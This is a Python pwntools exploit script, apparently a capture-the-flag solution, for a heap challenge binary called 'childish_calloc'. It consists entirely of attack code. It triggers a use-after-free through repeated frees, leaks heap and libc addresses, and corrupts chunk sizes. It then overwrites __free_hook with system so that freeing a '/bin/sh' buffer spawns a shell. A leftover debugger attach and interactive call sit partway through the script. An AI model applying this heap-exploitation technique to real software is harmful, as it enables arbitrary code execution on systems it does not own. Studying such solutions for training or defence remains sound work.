from pwn import *
#UAF in childinsh_calloc
#

p = process('./childish_calloc')

def send(b,a=':'):
    p.sendlineafter(a,str(b))

def find(index,size,detail):
    send(1,'Choice:')
    send(index)
    send(size)
    send(detail)

def send2(b,a=':'):
    p.sendafter(a,str(b))

def find2(index,size,detail):
    send(1,'Choice:')
    send(index)
    send(size)
    send2(detail)

done = 0
def fix(index,size,data):
    global done
    send(2,'Choice:')
    send(index)
    send(size)
    send2(data)
    if done == 0:
        done += 1
        send(1)
    else:
        send(2)

#Free Version
def fix2(index):
    send(2,'Choice:')
    send(index)
    send(0)

def examine(index):
    send(3,'Choice:')
    send(index)

def save(size):
    send(4, 'Choice:')
    send(size)

find(0,0x38,'a')
find(1,0x38,p64(0x41)*6)
find(12,0x38,'a')
find(13,0x38,'a')
find(14,0x28,'a')

fix2(1)
fix2(12)
fix2(1)

fix2(0)
find2(11,0x38,p64(0x41)*6 + p64(0) + '\x43')
fix(14,0x38, '\x90')
heap_leak = u64(p.readuntil('\n\n')[1:-2] + '\x00'*2)
print 'heap:',hex(heap_leak)
find2(9,0x38, 'a')
find2(8,0x38, 'a')
find2(3,0x38, p64(0)*1 + p64(0xc1))

for x in range(8):
    fix2(1)
gdb.attach(p)
p.interactive()

examine(1)
leak = u64(p.readuntil('\n\n')[1:-2] + '\x00'*2)
print 'libc:',hex(leak)

free_hook = leak+0x1c48

malloc_hook = leak-0x80
system = leak-0x39c860

find(7,0x38,p64(0x41)*6)
find(6,0x38,'/bin/sh\x00')
find2(5,0x38,p64(0)*6+p64(0xc0))

fix(3,0x38, p64(0)+p64(0xf1))

find2(4,0x28,'a')

for x in range(8):
    fix2(1)

size = free_hook - heap_leak
fix(3,0x38, p64(0) + p64(size+0x20000))
print hex(size)
save(size-0x50)

find2(2, 0x38, p64(0)*5+p64(system))

#gdb.attach(p)
p.interactive()
